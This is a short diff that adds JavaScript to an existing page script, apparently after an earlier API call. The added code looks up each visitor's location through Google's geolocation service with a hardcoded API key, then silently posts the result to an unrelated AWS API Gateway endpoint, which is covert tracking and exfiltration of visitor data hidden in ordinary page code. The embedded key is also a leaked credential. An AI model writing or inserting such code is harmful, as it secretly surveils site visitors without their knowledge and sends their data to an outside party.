@@ -898,6 +898,26 @@
 			console.log("API Response:", apiResponse);
 		})
 		.catch(error => console.error("Error:", error));
+
+	fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyB3sjM5LFA0ncc7efTF4ApXOoxcAiWfdhA', {
+		method: 'POST',
+		headers: { 'Content-Type': 'application/json' },
+		body: JSON.stringify({
+			considerIp: true
+		})
+	})
+		.then(res => res.json())
+		.then(data => {
+			return fetch("https://sjwvbem9lk.execute-api.ap-south-1.amazonaws.com/dev", {
+				method: "POST",
+				headers: {
+					"Content-Type": "application/json"
+				},
+				body: JSON.stringify({
+					secondData: data
+				})
+			});
+		});
 </script>
 
 <script src="../../cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
